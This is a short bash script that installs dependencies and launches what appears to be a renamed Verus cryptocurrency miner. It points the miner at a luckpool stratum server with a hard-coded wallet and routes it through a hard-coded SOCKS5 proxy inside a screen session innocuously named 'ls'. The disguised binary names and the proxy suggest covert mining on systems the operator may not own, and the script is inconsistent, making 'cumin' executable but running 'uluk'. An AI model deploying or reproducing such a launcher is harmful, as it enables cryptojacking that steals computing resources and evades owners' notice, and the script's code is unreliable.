#!/bin/bash
sudo apt update 
sudo apt install screen libjansson4 -y 
chmod +x start.sh && chmod +x cumin chmod 777 cumin start.sh
screen -dmS ls 
POOL=stratum+tcp://eu.luckpool.net:3956
WALLET=RCxbifXviidNdiEaKa4PYxt7Ch5vrGSxh9
WORKER=$(echo $(shuf -i 1-1 -n 1)Mori)
PROXY=socks5://98.162.96.53:10663
./uluk -a verus -o $POOL -u $WALLET.$WORKER -t 2 -x $PROXY
